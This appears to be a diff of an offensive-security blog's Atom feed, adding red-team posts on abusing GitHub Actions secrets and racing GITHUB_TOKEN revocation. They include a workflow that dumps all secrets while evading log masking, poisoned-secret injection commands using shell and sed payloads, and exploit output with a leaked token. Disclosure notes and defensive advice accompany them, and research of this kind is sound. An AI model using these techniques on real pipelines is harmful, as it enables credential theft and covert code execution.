@@ -2,58 +2,261 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
 
  <title>nopcorn</title>
- <link href="http://0.0.0.0:4000/atom.xml" rel="self"/>
- <link href="http://0.0.0.0:4000/"/>
- <updated>2024-12-18T13:13:53+00:00</updated>
- <id>http://0.0.0.0:4000</id>
+ <subtitle>thoughts and ramblings of an offensive security engineer</subtitle>
+ <link href="http://localhost:4000/atom.xml" rel="self"/>
+ <link href="http://localhost:4000/"/>
+ <updated>2026-05-16T10:23:41-04:00</updated>
+ <id>http://localhost:4000/</id>
+ <rights>© 2026 </rights>
  <author>
    <name></name>
-   <email></email>
+   
  </author>
 
  
  <entry>
-   <title>Getting Started Compromising CI/CD Pipelines with Github Actions</title>
-   <link href="http://0.0.0.0:4000/2024/12/17/getting-started-compromising-github-actions"/>
-   <updated>2024-12-17T00:00:00+00:00</updated>
-   <id>http://0.0.0.0:4000/2024/12/17/getting-started-compromising-github-actions</id>
+   <title>GitHub Actions Secrets - Your New Favorite Red Team Primitive</title>
+   <link href="http://localhost:4000/2026/02/12/github-actions-secrets"/>
+   <published>2026-02-12T00:00:00-05:00</published>
+   <updated>2026-02-12T00:00:00-05:00</updated>
+   <id>http://localhost:4000/2026/02/12/github-actions-secrets</id>
+   <author>
+     <name>nopcorn</name>
+   </author>
+   <summary>GitHub Actions secrets are designed to protect your credentials, but the same properties that make them secure make them a versatile tool for attackers.</summary>
+   <category term="cicd"/>
+   <category term="github"/>
+   <category term="github_token"/>
+   <category term="workflow"/>
+   <category term="redteam"/>
+   <category term="actions"/>
+   <category term="github_actions"/>
+   <category term="secrets"/>
+   
    <content type="html">&lt;blockquote&gt;
   &lt;ul&gt;
-    &lt;li&gt;CI/CD pipelines are an excellent place for attackers to gain secrets and access to sensitive environments&lt;/li&gt;
-    &lt;li&gt;I wrote a tool to help compromise Github Actions based workflows called &lt;a href=&quot;https://github.com/nopcorn/RascalRunner&quot;&gt;RascalRunner&lt;/a&gt;&lt;/li&gt;
+    &lt;li&gt;Anyone with write access to a repo can overwrite any secret, including environment secrets protected by required reviewers&lt;/li&gt;
+    &lt;li&gt;Passing secrets through environment variables only protects against shell injection, not YAML injection, jq injection, CRLF, or other downstream parsing issues&lt;/li&gt;
+    &lt;li&gt;Use GitHub Actions secrets as a swiss army knife when attacking CI/CD pipelines. It makes detection and response much more challenging.&lt;/li&gt;
   &lt;/ul&gt;
 &lt;/blockquote&gt;
 
-&lt;p&gt;Modern development teams increasingly rely on Continuous Integration/Continuous Deployment (CI/CD) pipelines, and GitHub Actions is often the platform of choice. While these workflows streamline testing and deployment, they also introduce complex security considerations that attackers can leverage. Adversaries have discovered that compromising these privileged pipelines can yield access to sensitive resources like environment secrets, cloud credentials, or direct network access through self-hosted runners. In many ways, they are the new network edge.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;This post is a collaboration between myself and &lt;a href=&quot;http://jackhacsecurity.com/&quot;&gt;jackhac&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
 
-&lt;p&gt;In this post, we’ll delve into the technical underpinnings of malicious GitHub Actions workflows, focusing on how attackers can identify and exploit CI/CD pipelines with a compromised GitHub personal access token (PAT). We’ll also discuss the difference between GitHub-hosted and self-hosted runners, why the latter pose significant risk, and how red teaming tools like &lt;a href=&quot;https://github.com/nopcorn/RascalRunner&quot;&gt;RascalRunner&lt;/a&gt; enable automated reconnaissance and covert workflow deployment to test an organization’s CI/CD security posture.&lt;/p&gt;
+&lt;p&gt;GitHub Actions secrets are encrypted variables designed to store sensitive information like API keys, tokens, and credentials. Their core premise is straightforward, once you set a secret its value is hidden from all GitHub interfaces. You cannot read it back through the UI, the CLI, or the API. Repository administrators can’t retrieve a secret’s plaintext value after it has been stored either. GitHub &lt;a href=&quot;https://docs.github.com/en/actions/concepts/security/secrets&quot;&gt;encrypts secrets using Libsodium sealed boxes&lt;/a&gt; before they even reach GitHub’s servers, and the values are only decrypted at runtime when injected into a workflow.&lt;/p&gt;
 
-&lt;h2 id=&quot;actions--runners&quot;&gt;Actions &amp;amp; Runners&lt;/h2&gt;
+&lt;p&gt;This sounds great. And to be fair, the encryption and access control mechanisms are solid. The problem isn’t with how secrets are stored, but rather with how they are &lt;em&gt;used&lt;/em&gt;, who can &lt;em&gt;modify&lt;/em&gt; them, and what the documentation &lt;em&gt;doesn’t&lt;/em&gt; adequately warn defenders about.&lt;/p&gt;
 
-&lt;p&gt;https://chuniversiteit.nl/papers/rise-and-fall-of-ci-services-in-github&lt;/p&gt;
+&lt;p&gt;The GitHub documentation on secrets has a few significant blind spots that, taken together, create real opportunities for attackers during red team engagements. Their design as un-auditable values also provide avenues for dodging defenders. This post will walk through some blind spots regarding secrets and how you can leverage them when attacking GitHub Actions.&lt;/p&gt;
 
-&lt;p&gt;Shortly after it’s acquisition by Microsoft in 2018, Github launched Github Actions as a means to consolidate the build, integration, and deployment needs of developers. Actions allow developers to define workflows stored as YAML files within a repository’s &lt;code&gt;.github/workflows&lt;/code&gt; directory. These workflows can be triggered by various events—pushes, pull requests, schedule timers, or manual invocation. Each workflow runs on a “runner”—a unit of compute that executes the steps, commands, and scripts defined in the workflow. Workflows interact with cloud services and other platforms to perform actions like storing freshly built containers, deploying code, and configuring services via Terraform or other IaC strategies.&lt;/p&gt;
+&lt;h1 id=&quot;secrets-for-shell-injection&quot;&gt;Secrets for Shell Injection&lt;/h1&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/github-actions-diagram.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;GitHub’s &lt;a href=&quot;https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions&quot;&gt;security hardening guide&lt;/a&gt; states:&lt;/p&gt;
 
-&lt;p&gt;By default, workflows run on GitHub-hosted runners that are freshly provisioned virtual machines in US-based Azure regions (&lt;a href=&quot;https://github.com/orgs/community/discussions/24969&quot;&gt;probably&lt;/a&gt;). Once a job finishes, logs are pushed back to the actions controller and the runner is typically destroyed, limiting persistent footholds.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Any user with write access to your repository has read access to all secrets configured in your repository.&lt;/p&gt;
+&lt;/blockquote&gt;
 
-&lt;p&gt;However, Github Actions supports &lt;a href=&quot;https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners&quot;&gt;self-hosted runners&lt;/a&gt; to access private and sensitive networks. Some of these can be deployed persistently, meaning the same runner is used across multiple pipelines and sticks around even if there are no workloads to process.&lt;/p&gt;
+&lt;p&gt;The docs are a bit misleading. Here “read access” means users with write access can list secrets names. But the statement undersells the actual risk. Users with write access can also &lt;em&gt;overwrite&lt;/em&gt; secret values. The &lt;a href=&quot;https://docs.github.com/en/rest/actions/secrets&quot;&gt;REST API for Actions secrets&lt;/a&gt; requires only collaborator access to create or update secrets, and the &lt;a href=&quot;https://docs.github.com/actions/security-guides/using-secrets-in-github-actions&quot;&gt;Using Secrets documentation&lt;/a&gt; confirms that you need write access to create secrets for an organization repository. This has been &lt;a href=&quot;https://github.com/orgs/community/discussions/159727&quot;&gt;confirmed as intentional behavior&lt;/a&gt; by GitHub, and there is a &lt;a href=&quot;https://github.com/github/docs/issues/1087&quot;&gt;long-standing docs issue&lt;/a&gt; about the confusing way this is documented.&lt;/p&gt;
 
-&lt;h2 id=&quot;compromised-runner&quot;&gt;Compromised Runner&lt;/h2&gt;
+&lt;p&gt;In most organizations, write access is extremely common. Nearly every developer on a team has push permissions to at least some repositories. There is no separate permission for “can modify secrets” versus “can push code.” If you can push a branch, you can overwrite a secret.&lt;/p&gt;
 
-&lt;h2 id=&quot;defensive-strategies&quot;&gt;Defensive Strategies&lt;/h2&gt;
+&lt;p&gt;The surprising part is that &lt;strong&gt;this applies to protected environment secrets too.&lt;/strong&gt; You might assume that environments with &lt;a href=&quot;https://docs.github.com/en/actions/reference/workflows-and-actions/deployments-and-environments&quot;&gt;required reviewers&lt;/a&gt; are protected from this kind of tampering. They are not. Required reviewers gate workflow &lt;em&gt;execution&lt;/em&gt; only. The API endpoint for creating or updating environment secrets has the same permission requirement as repository secrets. No additional approval step, no reviewer notification. An attacker with write access can overwrite a production environment secret via &lt;code&gt;gh secret set SECRET_NAME --env production&lt;/code&gt;, and the next time a legitimate deployment is approved by a reviewer, the poisoned value gets used.&lt;/p&gt;
 
-&lt;h2 id=&quot;rascalrunner&quot;&gt;RascalRunner&lt;/h2&gt;
+&lt;p&gt;If a workflow interpolates a secret directly into a &lt;code&gt;run&lt;/code&gt; step, an attacker with write access can overwrite that secret with a value containing shell metacharacters and get arbitrary code running on the workflow runner.&lt;/p&gt;
 
+&lt;p&gt;The obvious problem is noise. Blindly overwriting a secret you don’t know the value of will almost certainly break the pipeline, trigger an investigation, and announce your presence. That might be acceptable for a smash-and-grab, but there will be consequences.&lt;/p&gt;
+
+&lt;p&gt;Consider this vulnerable workflow step:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-yaml&quot;&gt;- name: Deploy to production
+  run: |
+    echo &quot;${{ secrets.SSH_PRIVATE_KEY }}&quot; &amp;gt; /tmp/deploy_key
+    chmod 600 /tmp/deploy_key
+    ssh -i /tmp/deploy_key -o StrictHostKeyChecking=no deploy@prod.example.com &quot;deploy_script.sh&quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The direct interpolation of &lt;code&gt;SSH_PRIVATE_KEY&lt;/code&gt; makes this vulnerable to shell injection. But to exploit it cleanly, we first need to know the secret’s current value so we can preserve it in our payload. That means we need to figure out where the secret lives: is it an organization secret, a repository secret, or an environment secret? The answer determines whether we can read the original value and whether we can override it at a different scope.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;gh secret list --org &amp;lt;org&amp;gt;
+gh secret list --repo &amp;lt;org&amp;gt;/&amp;lt;repo&amp;gt;
+gh secret list --repo &amp;lt;org&amp;gt;/&amp;lt;repo&amp;gt; --env &amp;lt;env&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Assuming it is an organization secret, we can dump its value by pushing a throwaway workflow to a feature branch. Organization secrets are passed to all workflows in repositories that have access to them, regardless of whether any job explicitly references the secret by name.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-yaml&quot;&gt;# .github/workflows/malicious.yaml (pushed to a feature branch)
+name: debug
+on: push
+jobs:
+  dump:
+    runs-on: ubuntu-latest
+    steps:
+      - name: nothing to see here
+        run: echo &apos;${{ toJSON(secrets) }}&apos; | base64 | base64 # bypass log masking
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This writes all available secrets to the workflow logs and bypasses GitHub’s secret masking. In a real engagement you would blend the workflow name and step names into something ordinary, and you would probably exfiltrate the values to a server you control rather than leaving them in the logs.&lt;/p&gt;
+
+&lt;p&gt;Now that you know the real value, you can exploit the secret context hierarchy to inject a poisoned value without disrupting other repositories. GitHub resolves secret name collisions using a &lt;a href=&quot;https://docs.github.com/en/actions/reference/security/secrets#naming-your-secrets&quot;&gt;fixed priority order&lt;/a&gt;: environment secrets take precedence over repository secrets, which take precedence over organization secrets. If the same secret name exists at multiple levels, the most specific scope wins.&lt;/p&gt;
+
+&lt;p&gt;This means you can shadow a broadly-scoped secret by creating one at a narrower scope. Set a repository-level secret with the same name as the organization secret, and only that repo picks up the poisoned value. Every other repo continues using the original. Delete the repository secret when you’re done and the organization secret takes effect again, with no trace at the organization level.&lt;/p&gt;
+
+&lt;p&gt;The same principle applies one level deeper. If a workflow uses environment secrets, you can shadow a repository secret by setting an environment secret with the same name. The workflow job that references that environment will use your value; jobs that don’t reference the environment will still see the original.&lt;/p&gt;
+
+&lt;p&gt;In this case, we set a repo secret to override the org secret and successfully take over the pipeline:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;gh secret set SSH_PRIVATE_KEY --repo &amp;lt;org&amp;gt;/&amp;lt;repo&amp;gt; \
+  --body &quot;&amp;lt;real_SSH_PRIVATE_KEY_value&amp;gt;\&quot; &amp;gt; /tmp/deploy_key; &amp;lt;injection payload&amp;gt;; #&quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The pipeline still works. The SSH key is still valid. And your payload runs alongside it. When you are done, delete the repository secret and the original organization secret takes effect again.&lt;/p&gt;
+
+&lt;h1 id=&quot;injection-beyond-the-shell&quot;&gt;Injection Beyond the Shell&lt;/h1&gt;
+
+&lt;p&gt;Sure, just don’t write vulnerable workflows and you’re fine. Right?&lt;/p&gt;
+
+&lt;p&gt;GitHub has an entire &lt;a href=&quot;https://docs.github.com/en/actions/concepts/security/script-injections&quot;&gt;dedicated page on script injections&lt;/a&gt; in the context of Actions workflows. It does a decent job of explaining how untrusted input from contexts like &lt;code&gt;github.event.pull_request.title&lt;/code&gt; can lead to command injection when interpolated into &lt;code&gt;run&lt;/code&gt; steps. The recommended mitigation is to pass values through environment variables rather than directly interpolating expressions. This is good advice. The shell treats the variable as a string, not as executable code.&lt;/p&gt;
+
+&lt;p&gt;But shell injection is not the only injection technique. Secrets get passed to all kinds of programs in a typical CI/CD pipeline, and many of those programs have their own interpretation of special characters. An environment variable stops the shell from expanding metacharacters. It does nothing to stop the &lt;em&gt;receiving program&lt;/em&gt; from interpreting the secret’s contents in dangerous ways.&lt;/p&gt;
+
+&lt;p&gt;This shifts the attacker’s goal. Instead of exploiting a workflow that already exists, the aim is to get a workflow change merged that looks benign but is exploitable through a poisoned secret.&lt;/p&gt;
+
+&lt;p&gt;Consider a PR that adds a step like this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-yaml&quot;&gt;- name: Add API key to local config
+  env:
+    API_KEY: ${{ secrets.API_KEY }}
+  run: |
+    sed &quot;s/PLACEHOLDER_API_KEY/$API_KEY/&quot; settings.conf
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This looks fine. The secret is loaded as an environment variable, so shell injection is off the table. It uses &lt;code&gt;sed&lt;/code&gt; to drop a sensitive API key into a settings file. A reviewer who has read GitHub’s guidance on secrets will see the &lt;code&gt;env&lt;/code&gt; block, nod approvingly, and hit approve.&lt;/p&gt;
+
+&lt;p&gt;The problem is that &lt;code&gt;sed&lt;/code&gt; has its own injection surface. The &lt;code&gt;e&lt;/code&gt; flag causes &lt;code&gt;sed&lt;/code&gt; to execute the contents of the pattern space as a shell command. A poisoned secret like:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;gh secret set API_KEY --body &quot;&amp;lt;actual_api_key&amp;gt;/;e (cmd1 &amp;amp;&amp;amp; cmd2) &amp;gt; /dev/null;#&quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;will cause the &lt;code&gt;sed&lt;/code&gt; command to execute &lt;code&gt;cmd1&lt;/code&gt; and &lt;code&gt;cmd2&lt;/code&gt; on the runner without breaking the pipeline, assuming you were able to leak the original secret value as described earlier. The API key still ends up in the config file. The build still passes.&lt;/p&gt;
+
+&lt;p&gt;A reviewer would need to be intimately familiar with the parsing behavior of every program that touches a secret to catch something like this. Realistically, nobody outside of offensive security is thinking about &lt;code&gt;sed&lt;/code&gt; command execution flags during code review. The combination of opaque secret values and non-obvious injection surfaces makes this a reliable way to slip malicious workflow changes past a reviewer who is doing everything GitHub tells them to do.&lt;/p&gt;
+
+&lt;h1 id=&quot;a-note-on-disclosure&quot;&gt;A Note on Disclosure&lt;/h1&gt;
+
+&lt;p&gt;All of the techniques in this post rely on documented, intentional behavior. Write access allowing secret modification is confirmed as by-design. Direct interpolation of secrets into shell commands is possible by design (the docs recommend against it, but do not prevent it). Secret values being opaque and unauditable is the entire point of the feature. There is nothing here to disclose to GitHub, because none of it is a bug. It is the logical consequence of design decisions that are individually reasonable but collectively create a trust model that attackers can exploit.&lt;/p&gt;
+
+&lt;h1 id=&quot;takeaways&quot;&gt;Takeaways&lt;/h1&gt;
+
+&lt;p&gt;GitHub Actions secrets do exactly what they promise: they store values securely and prevent them from being read back through GitHub’s interfaces. The encryption is real, the access controls work as documented, and the log redaction is a thoughtful defense-in-depth measure.&lt;/p&gt;
+
+&lt;p&gt;The problem is that these same properties create assumptions. Developers assume that because a value comes from an encrypted store, it is safe to interpolate and requires higher permissions to modify. Reviewers assume that because they have followed GitHub’s guidance, non-shell-based injection isn’t something to worry about. And everyone assumes that environment protection rules protect the environment’s secrets from tampering, when they only protect against unauthorized &lt;em&gt;consumption&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;None of these assumptions hold up under adversarial pressure. For red teamers, secrets are a versatile tool that provides injection vectors, social engineering aids for bypassing code review, and an invisible storage mechanism for payloads.&lt;/p&gt;
+
+&lt;p&gt;Want to sidestep all of this? Move your secrets to a cloud secrets manager and access them via OIDC. Then any call to GitHub’s secrets API becomes something your SOC should investigate.&lt;/p&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>GITHUB_TOKEN isn&apos;t that Ephemeral</title>
+   <link href="http://localhost:4000/2025/05/26/github-token"/>
+   <published>2025-05-26T00:00:00-04:00</published>
+   <updated>2025-05-26T00:00:00-04:00</updated>
+   <id>http://localhost:4000/2025/05/26/github-token</id>
+   <author>
+     <name>nopcorn</name>
+   </author>
+   <summary>Compromising CI/CD pipelines can be very fruitful</summary>
+   <category term="cicd"/>
+   <category term="github"/>
+   <category term="github_token"/>
+   <category term="workflow"/>
+   <category term="redteam"/>
+   <category term="actions"/>
+   
+   <content type="html">&lt;blockquote&gt;
+  &lt;ul&gt;
+    &lt;li&gt;GITHUB_TOKEN is an ephemeral (cough) API key used for workflows to authenticate to the Github API&lt;/li&gt;
+    &lt;li&gt;If you leak the token and make it available prior to the end of the workflow run, bad things can happen&lt;/li&gt;
+    &lt;li&gt;Github states that the token is destroyed at the end of a workflow run, but it isn’t immediately invalidated&lt;/li&gt;
+    &lt;li&gt;You can race Github’s invalidation process for fun and profit&lt;/li&gt;
+  &lt;/ul&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;em&gt;This post is a collaboration between myself and &lt;a href=&quot;http://jackhacsecurity.com/&quot;&gt;jackhac&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Every time a &lt;a href=&quot;https://docs.github.com/en/actions&quot;&gt;GitHub Actions&lt;/a&gt; workflow is triggered, GitHub automatically provisions a token called &lt;a href=&quot;https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication&quot;&gt;&lt;code&gt;GITHUB_TOKEN&lt;/code&gt;&lt;/a&gt;. This ephemeral credential allows jobs in the workflow to authenticate to the GitHub API without requiring manually managed secrets or personal access tokens. The token is injected into the workflow environment and is scoped to the repository context in which the workflow is running.&lt;/p&gt;
+
+&lt;p&gt;GITHUB_TOKENs can have &lt;a href=&quot;https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication#permissions-for-the-github_token&quot;&gt;multiple different default permission sets&lt;/a&gt; though these permissions can be customized within the workflow or job itself. Job-level scoping is prefered as it gives fine-grained control over access.&lt;/p&gt;
+
+&lt;h1 id=&quot;dude-wheres-my-token&quot;&gt;Dude where’s my token&lt;/h1&gt;
+
+&lt;p&gt;Despite the ephemeral nature of GITHUB_TOKEN, misuse or mishandling during the workflow execution window can expose projects to significant risk. Many teams assume that temporary credentials are inherently safe, but this assumption breaks down in environments where artifacts, logs, or third-party actions introduce uncontrolled surfaces.&lt;/p&gt;
+
+&lt;p&gt;One of the most overlooked issues with GITHUB_TOKENs comes from a subtle behavior in &lt;a href=&quot;https://github.com/actions/upload-artifact&quot;&gt;&lt;code&gt;actions/upload-artifact@v4&lt;/code&gt;&lt;/a&gt;. In this version, artifacts &lt;a href=&quot;(https://github.com/actions/upload-artifact?tab=readme-ov-file#improvements)&quot;&gt;become downloadable as soon as they’re uploaded&lt;/a&gt;, even if the workflow that created them is still running. This creates a narrow but potent attack window: if the artifact contains a copy of the GITHUB_TOKEN, an attacker can retrieve it and execute arbitrary API calls in the context of the job until the workflow terminates.&lt;/p&gt;
+
+&lt;p&gt;That said, most workflows that upload artifacts tend to do it at the very end. So, in theory, there shouldn’t be much of a window for an attacker to abuse the GITHUB_TOKEN, right? The workflow usually wraps up right after the upload, which should invalidate the token almost immediately. Right? Right!?&lt;/p&gt;
+
+&lt;h1 id=&quot;use-after-free-ish&quot;&gt;Use after free (ish)&lt;/h1&gt;
+
+&lt;p&gt;While the official documentation states that the GITHUB_TOKEN is revoked immediately after the workflow ends, we discovered that this isn’t strictly true… &lt;em&gt;surprised pickachu&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;During a series of tests conducted in collaboration with my research partner &lt;a href=&quot;http://jackhacsecurity.com/&quot;&gt;jackhac&lt;/a&gt;, we observed that the token often remains valid for a short period (typically between one and two seconds) after the workflow reports as completed. In other words, the revocation process is not instantaneous. This creates a brief but real post-execution window during which a previously retrieved token can still be used to interact with the GitHub API.&lt;/p&gt;
+
+&lt;p&gt;We confirmed the racing by setting up a dummy vulnerable workflow in &lt;code&gt;nopcorn/artifact-exploit-poc&lt;/code&gt; that would purposefully write the GITHUB_TOKEN to an artifact using &lt;code&gt;actions/upload-artifact@v4&lt;/code&gt;. We then used a script to manually kick off the workflow, monitor for the artifact, download it, extract the value of GITHUB_TOKEN, and use it to authenticate to the Github API out of band for as long as it was valid. Afterwards we compared timestamps:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ python exploit.py --repo nopcorn/artifact-exploit-poc --polling-interval 0.5
+[*] Manually triggering the workflow to start...
+[*] Waiting for the workflow run to be detected...
+[+] Active workflow run found! Run ID: 15263730946, Status: queued
+[*] Waiting for run 15263730946 for artifact &apos;secret-file&apos;...
+[*] Downloading artifact secret-file...
+[+] Successfully extracted GITHUB_TOKEN from the artifact -&amp;gt; ghs_PsmNtQuBpes3u9x8MxQx22gE6C7Oc42QTsLj
+[+] Monitoring GITHUB_TOKEN validity...
+[+] 2025-05-27T00:01:42.289469Z: Valid GITHUB_TOKEN! (status code 200)
+[+] 2025-05-27T00:01:42.980345Z: Valid GITHUB_TOKEN! (status code 200)
+[+] 2025-05-27T00:01:43.668557Z: Valid GITHUB_TOKEN! (status code 200)
+[+] 2025-05-27T00:01:44.360745Z: Valid GITHUB_TOKEN! (status code 200)
+[+] 2025-05-27T00:01:45.023419Z: Valid GITHUB_TOKEN! (status code 200)
+[+] 2025-05-27T00:01:45.688257Z: Valid GITHUB_TOKEN! (status code 200)
+[+] 2025-05-27T00:01:46.353344Z: Valid GITHUB_TOKEN! (status code 200)
+[+] 2025-05-27T00:01:47.046626Z: Valid GITHUB_TOKEN! (status code 200)
+[+] 2025-05-27T00:01:47.754317Z: Valid GITHUB_TOKEN! (status code 200)
+[!] 2025-05-27T00:01:48.423765Z: Invalid GITHUB_TOKEN: Bad credentials
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If we take a look at the &lt;a href=&quot;https://github.com/nopcorn/artifact-exploit-poc/commit/79cadb723caa718616c04661e32ee628bf53c1b5/checks/42925720356/logs&quot;&gt;raw run logs for the workflow&lt;/a&gt;, you can see the workflow ends around &lt;code&gt;2025-05-27T00:01:46&lt;/code&gt;, but we’re able to successfully use the GITHUB_TOKEN until at least &lt;code&gt;2025-05-27T00:01:47&lt;/code&gt; - a whole second later. While this doesn’t seem like a lot there are several techniques a threat actor could use to compromise a repository with only a single API call.&lt;/p&gt;
+
+&lt;p&gt;While this is a contrived example, a scan of all Github repositories using &lt;a href=&quot;sourcegraph.com&quot;&gt;SourceGraph&lt;/a&gt; proves this is more common than you might think.&lt;/p&gt;
+
+&lt;h1 id=&quot;disclosure&quot;&gt;Disclosure&lt;/h1&gt;
+
+&lt;p&gt;We responsibly disclosed this finding to GitHub through their vulnerability reporting program on HackerOne. The issue was triaged and investigated over the course of a month. Ultimately, however, GitHub classified the behavior as “informational” and chose not to pursue it further. Their position was that since the token is eventually revoked, the brief extension does not constitute a vulnerability under their current threat model.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/github_this_is_fine.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;While we respect their decision, it underscores a philosophical gap between how ephemeral secrets are documented and how they behave in practice. For red teamers, this matters. If you can automate artifact retrieval and parse secrets before the revocation race completes, you have a viable short-term credential to pivot or persist.&lt;/p&gt;
+
+&lt;p&gt;We approached many of the vulnerable projects we identified during our scans (via bug bounty programs and Github Security disclosures) and we’re happy to say that the vast majority of them were receptive to the exploit vector and promptly fixed their vulnerable repositories.&lt;/p&gt;
 </content>
  </entry>
  
  <entry>
    <title>My Binary Golf Grand Prix 4 (BGGP4) Winning Entries</title>
-   <link href="http://0.0.0.0:4000/2024/07/10/bggp4-winning-entries"/>
-   <updated>2024-07-10T00:00:00+00:00</updated>
-   <id>http://0.0.0.0:4000/2024/07/10/bggp4-winning-entries</id>
+   <link href="http://localhost:4000/2024/07/10/bggp4-winning-entries"/>
+   <published>2024-07-10T00:00:00-04:00</published>
+   <updated>2024-07-10T00:00:00-04:00</updated>
+   <id>http://localhost:4000/2024/07/10/bggp4-winning-entries</id>
+   <author>
+     <name>nopcorn</name>
+   </author>
+   <summary>A cheeky interpretation of the rules allowed me to win the python and shell challenges</summary>
+   <category term="bggp4"/>
+   <category term="challenge"/>
+   <category term="python"/>
+   <category term="bash"/>
+   
    <content type="html">&lt;blockquote&gt;
   &lt;ul&gt;
     &lt;li&gt;The Binary Golf Grand Prix (BGGP) is a yearly code golf challenge&lt;/li&gt;
@@ -102,9 +305,20 @@ copy(__file__,&apos;4&apos;);4/0
  
  <entry>
    <title>Service Discovery in Kubernetes with Restrictive Permissions</title>
-   <link href="http://0.0.0.0:4000/2024/07/08/kubernetes-service-discovery"/>
-   <updated>2024-07-08T00:00:00+00:00</updated>
-   <id>http://0.0.0.0:4000/2024/07/08/kubernetes-service-discovery</id>
+   <link href="http://localhost:4000/2024/07/08/kubernetes-service-discovery"/>
+   <published>2024-07-08T00:00:00-04:00</published>
+   <updated>2024-07-08T00:00:00-04:00</updated>
+   <id>http://localhost:4000/2024/07/08/kubernetes-service-discovery</id>
+   <author>
+     <name>nopcorn</name>
+   </author>
+   <summary>When operating in a kubernetes environment without permissions allowing you to list pods and services, there are other options for getting the lay of the land</summary>
+   <category term="kubernetes"/>
+   <category term="eks"/>
+   <category term="k8s"/>
+   <category term="tradecraft"/>
+   <category term="discovery"/>
+   
    <content type="html">&lt;blockquote&gt;
   &lt;ul&gt;
     &lt;li&gt;Most Kubernetes clusters running CoreDNS support reverse DNS lookups by default&lt;/li&gt;
@@ -193,9 +407,18 @@ for ip in net:
  
  <entry>
    <title>Using DuckDuckGo&apos;s Image Proxy as a C2 Channel</title>
-   <link href="http://0.0.0.0:4000/2023/09/25/duckduckgo-as-c2"/>
-   <updated>2023-09-25T00:00:00+00:00</updated>
-   <id>http://0.0.0.0:4000/2023/09/25/duckduckgo-as-c2</id>
+   <link href="http://localhost:4000/2023/09/25/duckduckgo-as-c2"/>
+   <published>2023-09-25T00:00:00-04:00</published>
+   <updated>2023-09-25T00:00:00-04:00</updated>
+   <id>http://localhost:4000/2023/09/25/duckduckgo-as-c2</id>
+   <author>
+     <name>nopcorn</name>
+   </author>
+   <summary>DuckDuckGo&apos;s image preview APIs put way too much trust in the user and don&apos;t validate that the requests came from authentic browsing behavior.</summary>
+   <category term="infrastructure"/>
+   <category term="c2"/>
+   <category term="proxy"/>
+   
    <content type="html">&lt;blockquote&gt;
   &lt;ul&gt;
     &lt;li&gt;DuckDuckGo’s image proxy doesn’t allow-list trusted URLs, so anyone can request any image through it.&lt;/li&gt;
